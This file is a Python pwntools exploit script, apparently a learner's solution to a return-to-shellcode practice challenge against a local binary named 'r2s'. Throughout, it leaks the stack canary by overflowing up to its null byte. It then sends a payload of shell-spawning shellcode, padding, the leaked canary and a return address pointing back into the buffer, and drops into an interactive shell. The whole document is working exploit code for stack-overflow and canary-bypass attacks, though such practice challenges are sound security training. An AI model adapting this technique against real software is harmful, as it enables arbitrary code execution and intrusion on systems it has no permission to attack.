from pwn import *

p = process("./r2s")

context.arch = 'amd64'

# [0] printout form
def success_log(n, m):
    return success(": ".join([n,hex(m)])) # is there a success function in pwn lib?


# [1] get informations of buf and canary..
p.recvuntil('buf: ')
buf = int(p.recvline()[:-1], 16)
#print(len(buf), buf) 
success_log("Address of buf", buf)

p.recvuntil('$rbp: ')
buf2rbp = int(p.recvline()[:-1])
#buf2rbp = int(p.recvline().split()[0])
print(buf2rbp)
buf2cnry = buf2rbp - 8
success_log("buf <=> sfp", buf2rbp)
success_log("buf <=> canary", buf2cnry)


# [2] Leak canary value
payload = "A"*(buf2cnry + 1)
p.sendafter("Input: ", payload)
p.recvuntil(payload)  # why..?
cnry = u64(b"\x00"+p.recvn(7)) # receive canry about 7 lengths
success_log("Canary", cnry)



# [3] Exploit
shellcode = asm(shellcraft.sh())
print("Shellcode : ", shellcode, "Length : ", int(len(shellcode)))

payload = shellcode
payload += b"A"*(0x58-len(shellcode)) #buf - shellcode
payload += p64(cnry)
payload += b"B"*8
payload += p64(buf)

#payload = shellcode.ljust(buf2cnry, b"A") + p64(cnry) + b"B"*0x8 + p64(buf)
p.send(payload)
p.interactive()